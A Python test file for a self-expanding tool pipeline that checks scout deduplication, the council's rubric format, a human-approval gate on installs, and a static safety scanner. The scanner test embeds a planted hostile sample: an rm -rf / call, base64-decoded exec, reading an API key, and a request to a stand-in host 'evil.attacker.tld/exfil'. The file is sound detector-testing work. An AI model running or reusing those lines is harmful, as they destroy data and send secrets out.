"""
Tests for the Self-Expanding Pipeline (Subsystem 1).

Run directly:  python3 test_expansion_monitor.py
No network, no real Supabase, no real Claude — an in-memory fake Supabase and
monkeypatched scouts/council, same approach used to verify task_manager.

Covers (per the plan):
  1. scout finding DEDUPLICATION (never resubmit a known URL, incl. within one run)
  2. council RUBRIC output format (required keys + decision in {approve,reject,defer})
  3. applicator APPROVAL-GATE enforcement (refuses to execute without human approval)
  4. static safety SCANNER (flags planted subprocess / base64-exec / creds / domains)
"""

import json
import os
import sys

import expansion_pipeline as ep


# ---- in-memory fake Supabase (chainable, mimics the client surface we use) ----
class FakeQuery:
    def __init__(self, store, table):
        self.store, self.table_name = store, table
        self._filters, self._op, self._payload = [], None, None

    def insert(self, row): self._op, self._payload = "insert", row; return self
    def update(self, row): self._op, self._payload = "update", row; return self
    def select(self, *a): self._op = "select"; return self
    def eq(self, k, v): self._filters.append((k, v)); return self
    def order(self, *a, **k): return self
    def limit(self, n): return self

    def execute(self):
        if self._op == "insert":
            rid = len(self.store["_all"]) + 1
            rec = {"id": rid, "agent_name": self._payload["agent_name"],
                   "output_text": self._payload["output_text"],
                   "created_at": f"2026-07-20T00:00:{rid:02d}-04:00"}
            self.store["_all"].append(rec)
            return type("R", (), {"data": [rec]})
        if self._op == "update":
            for rec in self.store["_all"]:
                if all(rec.get(k) == v for k, v in self._filters):
                    rec.update(self._payload)
            return type("R", (), {"data": [1]})
        data = [r for r in self.store["_all"] if all(r.get(k) == v for k, v in self._filters)]
        data.sort(key=lambda r: r["id"], reverse=True)
        return type("R", (), {"data": data})


class FakeSB:
    def __init__(self): self.store = {"_all": []}
    def table(self, name): return FakeQuery(self.store, name)


PASS, FAIL = "PASS    ", "**FAIL**"
_results = []


def check(label, cond):
    _results.append(bool(cond))
    print(f"{PASS if cond else FAIL} {label}")


def _reset(council_fn=None):
    ep.init(claude_client=None, supabase_client=FakeSB(), tool_dispatcher=None,
            council_call_fn=council_fn or (lambda s, u: ""), log_council_fn=lambda *a, **k: None,
            tools_list=[], excluded_tools=set())


# ============================================================
def test_dedup():
    print("\n=== 1. scout dedup ===")
    _reset()
    # a finding already in the table
    ep._insert_finding({"name": "known", "url": "https://github.com/acme/known", "status": "found"})

    # scouts return: the known url (dup), a new url, and the new url AGAIN (in-run dup)
    ep.github_scout = lambda brief, cap: [
        {"name": "known", "url": "https://github.com/acme/known/", "what": "x"},   # trailing slash → same
        {"name": "fresh", "url": "https://github.com/acme/fresh", "what": "y"},
    ]
    ep.web_scout = lambda brief, cap: [
        {"name": "fresh-dup", "url": "https://github.com/acme/fresh", "what": "y2"},  # dup within run
        {"name": "other", "url": "https://example.com/tool", "what": "z"},
    ]
    out = ep.run_scout(focus_brief="test", sources="both", cap=10)

    urls = [json.loads(r["output_text"]).get("url") for r in ep.supabase.store["_all"]
            if r["agent_name"] == "expansion_finding"]
    check("known URL not resubmitted (dedupe vs table)", urls.count("https://github.com/acme/known/") == 0)
    check("new URLs inserted exactly once each",
          sorted(u for u in urls if u != "https://github.com/acme/known") ==
          ["https://example.com/tool", "https://github.com/acme/fresh"])
    check("in-run duplicate collapsed (fresh added once)",
          urls.count("https://github.com/acme/fresh") == 1)
    check("summary reports the new count", "queued 2 new" in out)


# ============================================================
def test_rubric_format():
    print("\n=== 2. council rubric format ===")

    good_rubric = {
        "usefulness": 4, "integration_effort": "small", "maintenance_burden": "low",
        "security_risk": 2, "license_compatibility": "compatible", "overlap_with_existing": "none",
        "verdict": "Solid, low-risk, fills a real gap.", "decision": "approve",
    }

    def council_good(system, user):
        # rubric call is the one whose system prompt is the rubric system
        if "EXPANSION-REVIEW" in system:
            return "```json\n" + json.dumps(good_rubric) + "\n```"
        return "- a bullet"   # advocate / critic

    _reset(council_good)
    rid = ep._insert_finding({"name": "cand", "url": "https://github.com/a/b", "status": "found"})
    res = ep.expansion_review_one(rid, ep._find_row(rid))

    required = {"usefulness", "integration_effort", "maintenance_burden", "security_risk",
                "license_compatibility", "overlap_with_existing", "verdict", "decision"}
    check("rubric has all required keys", required.issubset(res["rubric"].keys()))
    check("decision ∈ {approve,reject,defer}", res["decision"] in ("approve", "reject", "defer"))
    check("approve → finding status 'approved'", ep._find_row(rid)["status"] == "approved")
    check("rubric persisted onto finding", ep._find_row(rid)["council"]["usefulness"] == 4)

    # unparseable rubric must FAIL-SAFE to 'defer' (never silently approve/drop)
    def council_junk(system, user):
        return "the council could not produce JSON, sorry"
    _reset(council_junk)
    rid2 = ep._insert_finding({"name": "c2", "url": "https://github.com/a/c", "status": "found"})
    res2 = ep.expansion_review_one(rid2, ep._find_row(rid2))
    check("unparseable rubric → deferred (fail-safe)", res2["decision"] == "defer"
          and ep._find_row(rid2)["status"] == "deferred")


# ============================================================
def test_approval_gate():
    print("\n=== 3. applicator approval gate ===")
    _reset()
    plan = {"finding_id": 1, "name": "risky", "url": "https://github.com/a/b",
            "pinned_commit": "deadbeef" * 5, "install_dir": "/tmp/should_never_be_created_by_test",
            "commands": [], "is_repo": True}

    # queue a PENDING (not approved) action, then try to execute
    action_id = ep._queue_install_approval(plan)
    check("_action_is_approved False while pending", ep._action_is_approved(action_id) is False)

    before = os.path.exists(plan["install_dir"])
    result = ep._execute_install(plan, action_id)
    check("execute REFUSES without approval", result["ok"] is False and "refused" in result["error"])
    check("nothing installed to disk when refused",
          before == os.path.exists(plan["install_dir"]) and not os.path.exists(plan["install_dir"]))

    # a repo plan with NO pinned commit must also be refused (no unpinned installs),
    # even if (hypothetically) approved.
    for rec in ep.supabase.store["_all"]:
        if rec["id"] == action_id:
            a = json.loads(rec["output_text"]); a["status"] = "approved"
            rec["output_text"] = json.dumps(a)
    unpinned = dict(plan, pinned_commit="")
    r2 = ep._execute_install(unpinned, action_id)
    check("execute refuses unpinned repo even when approved", r2["ok"] is False and "pin" in r2["error"])

    # apply_finding on a non-approved finding never reaches the installer
    rid = ep._insert_finding({"name": "x", "url": "https://github.com/a/b", "status": "found"})
    msg = ep.apply_finding(rid)
    check("apply_finding rejects a non-'approved' finding", "not 'approved'" in msg or "not approved" in msg)


# ============================================================
def test_static_scanner():
    print("\n=== 4. static safety scanner ===")
    risky = (
        "import subprocess, base64\n"
        "subprocess.run(['rm','-rf','/'])\n"
        "exec(base64.b64decode('cHJpbnQoMSk='))\n"
        "key = os.environ['OPENAI_API_KEY']\n"
        "import requests; requests.get('https://evil.attacker.tld/exfil')\n"
    )
    flags = ep._static_safety_scan(risky)
    cats = {f["category"] for f in flags}
    check("flags shell execution", "shell execution" in cats)
    check("flags dynamic code execution", "dynamic code execution" in cats)
    check("flags credential access", "credential / secret access" in cats)
    check("flags network call", "network call" in cats)
    domain_flag = next((f for f in flags if f["category"] == "outbound domains"), None)
    check("flags unexpected outbound domain",
          domain_flag is not None and "evil.attacker.tld" in domain_flag["domains"])

    clean = "def add(a, b):\n    return a + b\n"
    clean_cats = {f["category"] for f in ep._static_safety_scan(clean)}
    check("clean code raises no shell/exec/cred flags",
          not ({"shell execution", "dynamic code execution", "credential / secret access"} & clean_cats))


if __name__ == "__main__":
    test_dedup()
    test_rubric_format()
    test_approval_gate()
    test_static_scanner()
    total, passed = len(_results), sum(_results)
    print(f"\n{'='*48}\n{passed}/{total} checks passed")
    sys.exit(0 if passed == total else 1)
